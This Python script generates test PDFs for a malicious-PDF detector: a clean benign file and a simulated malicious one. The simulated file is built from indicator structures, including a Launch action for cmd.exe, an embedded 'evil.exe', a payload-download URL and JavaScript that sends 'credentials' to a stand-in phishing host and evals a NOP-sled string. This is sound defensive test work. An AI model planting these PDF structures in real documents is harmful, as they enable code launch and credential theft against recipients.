"""
create_test_pdfs.py
-------------------
Creates two test PDFs for system validation:

1. test_malicious_sim.pdf  — contains all malicious structural indicators
   (JavaScript, OpenAction, embedded file, suspicious URLs, high entropy)
   NO actual exploit — safe to open, triggers the detector correctly.

2. test_benign.pdf  — a clean document with no suspicious features.
"""

import sys, os, math, random
sys.path.insert(0, "src")
from pathlib import Path

# ── We build the PDFs by hand as raw bytes so we can inject
#    every structural indicator directly ──────────────────────────────────────

def _entropy_bytes(n: int, seed: int = 42) -> bytes:
    """Generate pseudo-random bytes to simulate high-entropy streams."""
    rng = random.Random(seed)
    return bytes(rng.randint(0, 255) for _ in range(n))


# ============================================================================
# 1. Simulated Malicious PDF
# ============================================================================
def make_malicious_pdf(path: str) -> None:
    """
    Build a syntactically valid PDF that contains every indicator
    the detector looks for.  Contains NO working exploit — purely structural.
    """

    # High-entropy stream (simulates obfuscated payload)
    entropy_data = _entropy_bytes(2048)

    # Build raw PDF as a byte string
    pdf = b"""%PDF-1.7
%\xe2\xe3\xcf\xd3

% ---- Catalog with OpenAction and AA ----
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /OpenAction << /Type /Action /S /JavaScript
                  /JS (app.alert("This is a test. Not malicious.");) >>
   /AA << /WC << /Type /Action /S /JavaScript /JS (/* AA test */) >>
          /WS << /Type /Action /S /JavaScript /JS (/* AA open */) >> >>
   /AcroForm << /Fields [] /XFA (xfa_placeholder) >>
   /Names << /EmbeddedFiles << /Names [(evil.exe) 7 0 R] >> >>
>>
endobj

% ---- Pages ----
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

% ---- Page ----
3 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Contents 4 0 R
   /Annots [5 0 R 6 0 R]
   /Resources << /Font << /F1 << /Type /Font /Subtype /Type1
                                  /BaseFont /Helvetica >> >> >>
>>
endobj

% ---- Content stream ----
4 0 obj
<< /Length 120 >>
stream
BT
/F1 12 Tf
50 750 Td
(SIMULATED MALICIOUS PDF - FOR TESTING ONLY) Tj
0 -20 Td (This PDF contains structural malware indicators.) Tj
ET
endstream
endobj

% ---- URI Annotation (suspicious URL) ----
5 0 obj
<< /Type /Annot /Subtype /Link
   /Rect [50 700 300 720]
   /A << /Type /Action /S /URI
         /URI (http://malware-download.tk/payload.exe) >>
>>
endobj

% ---- Launch Annotation ----
6 0 obj
<< /Type /Annot /Subtype /Link
   /Rect [50 670 300 690]
   /A << /Type /Action /S /Launch
         /F << /Type /Filespec /F (cmd.exe) /DOS (cmd.exe) >> >>
>>
endobj

% ---- Embedded file (EmbeddedFile object) ----
7 0 obj
<< /Type /Filespec /F (evil.exe)
   /EF << /F 8 0 R >>
>>
endobj

% ---- Embedded file stream (high entropy content) ----
8 0 obj
<< /Type /EmbeddedFile /Length """ + str(len(entropy_data)).encode() + b""" >>
stream
""" + entropy_data + b"""
endstream
endobj

% ---- Second suspicious URL via JavaScript ----
9 0 obj
<< /Type /Action /S /JavaScript
   /JS (
     var url = "http://phishing-site.xyz/steal?data=credentials";
     app.launchURL(url, true);
     var x = unescape("%u9090%u9090");
     eval(x);
   )
>>
endobj

% ---- ObjStm (object stream - obfuscation indicator) ----
10 0 obj
<< /Type /ObjStm /N 1 /First 9 /Length 30 >>
stream
99 0 << /Type /Dummy >>
endstream
endobj

% ---- XRef stream ----
xref
0 11
0000000000 65535 f\r
0000000009 00000 n\r
0000000058 00000 n\r
0000000115 00000 n\r
0000000206 00000 n\r
0000000440 00000 n\r
0000000580 00000 n\r
0000000710 00000 n\r
0000000820 00000 n\r
0000003000 00000 n\r
0000003200 00000 n\r

trailer
<< /Size 11 /Root 1 0 R >>
startxref
3400
%%EOF"""

    Path(path).write_bytes(pdf)
    print(f"Created: {path}")


# ============================================================================
# 2. Clean Benign PDF
# ============================================================================
def make_benign_pdf(path: str) -> None:
    """A completely clean PDF with no suspicious features."""
    try:
        from fpdf import FPDF
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Helvetica", "B", 16)
        pdf.cell(0, 12, "Clean Benign Test Document", new_x="LMARGIN", new_y="NEXT")
        pdf.set_font("Helvetica", size=12)
        pdf.multi_cell(0, 8,
            "This is a clean, benign PDF created for testing the "
            "Malicious PDF Detection System.\n\n"
            "It contains:\n"
            "  - No JavaScript\n"
            "  - No OpenAction triggers\n"
            "  - No embedded files\n"
            "  - No suspicious URLs\n"
            "  - Normal stream entropy\n\n"
            "Expected result: BENIGN with low risk score."
        )
        pdf.output(path)
        print(f"Created: {path}")
    except ImportError:
        print("fpdf2 not found, creating minimal benign PDF manually")
        raw = (b"%PDF-1.4\n"
               b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
               b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
               b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
               b"/Contents 4 0 R /Resources << /Font << /F1 << /Type /Font "
               b"/Subtype /Type1 /BaseFont /Helvetica >> >> >> >>\nendobj\n"
               b"4 0 obj\n<< /Length 44 >>\nstream\n"
               b"BT /F1 12 Tf 50 750 Td (Benign PDF) Tj ET\n"
               b"endstream\nendobj\n"
               b"xref\n0 5\n0000000000 65535 f\r\n"
               b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n9\n%%EOF")
        Path(path).write_bytes(raw)
        print(f"Created: {path}")


# ── Main ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    out = Path("data")
    out.mkdir(exist_ok=True)

    mal_path = str(out / "test_malicious_sim.pdf")
    ben_path = str(out / "test_benign.pdf")

    make_malicious_pdf(mal_path)
    make_benign_pdf(ben_path)

    print("\n" + "="*55)
    print("  Test PDFs created in data/")
    print("="*55)
    print(f"  SIMULATED MALICIOUS : {mal_path}")
    print(f"    Contains: JavaScript, OpenAction, Launch, AA,")
    print(f"    EmbeddedFile, ObjStm, suspicious URLs, high entropy")
    print(f"    Expected: HIGH risk score / Malicious or Suspicious")
    print()
    print(f"  CLEAN BENIGN        : {ben_path}")
    print(f"    Contains: plain text only, no indicators")
    print(f"    Expected: LOW risk score / Benign")
    print("="*55)
    print("\nUpload both to http://localhost:8501 to test the detector.")
